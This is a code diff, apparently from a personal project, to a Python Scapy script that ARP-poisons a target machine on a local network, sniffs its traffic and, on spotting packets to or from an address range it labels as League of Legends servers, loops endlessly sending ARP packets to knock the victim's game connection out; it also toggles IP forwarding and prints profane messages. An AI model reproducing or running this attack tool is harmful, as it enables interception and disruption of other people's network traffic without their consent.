@@ -1,8 +1,15 @@
 #192.64.168.0 - 192.64.175.255
-import time
-def LeagueCanceller(pkt):
+import time, sys, argparse
+from scapy.all import *
+def LeagueCanceller(pkt, targets, interface, MACs):
     print(pkt.summary())
-
+    print(f'The destination ip is {pkt[IP].dst}')
+    print(f'The source ip is {pkt[IP].src}')
+    if(isLeagueIP(pkt[IP].dst) or isLeagueIP(pkt[IP].src)):
+        while 1:
+            print("FUCK YOU DWEEB")
+            print(f'the targets are {targets} and the interface is {interface}')
+            DDoSButBased(targets, interface, MACs)
 class PreAttack(object):
     def __init__(self, targ, iface):
         self.target = targ
@@ -68,7 +75,7 @@ def Rosie(interface, gWayT, target, fwd):
        try:
            try:
                Attack(targets, interface).KuzcosPoison(MACs)
-               sniff(count=5, prn=LeagueCanceller, filter=f'udp and host {targets[1]}')
+               sniff(count=5, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
                #sniff(prn=lambda x:x.summary(), count=1)
            except Exception:
                print('Failed to poison')
@@ -78,6 +85,17 @@ def Rosie(interface, gWayT, target, fwd):
        except KeyboardInterrupt:
            break;
     #fix the ARP tables
+    DDoSButBased(targets, interface, MACs)
+    try:
+        if fwd:
+            print('Disable IP forwarding')
+            sys.stdout.flush()
+            PreAttack.togggleIPForward().disableIPForward()
+            print('[POGGED]')
+    except IOError:
+        print('[FUCK]')
+
+def DDoSButBased(targets, interface, MACs):
     for i in range(0,16):
         try:
             Attack(targets, interface).FixItFelix(MACs)
@@ -87,12 +105,7 @@ def Rosie(interface, gWayT, target, fwd):
             sys.exit(1)
         time.sleep(2)
     print('[POGGED]')
-    try:
-        if fwd:
-            print('Disable IP forwarding')
-            sys.stdout.flush()
-            PreAttack.togggleIPForward().disableIPForward()
-            print('[POGGED]')
-    except IOError:
-        print('[FUCK]')
-        
+
+def isLeagueIP(ipAddr):
+    ip = ipAddr.split('.')
+    return ip[0] == "192" and ip[1] == "64" and int(ip[2]) >=168 and int(ip[2]) <= 175
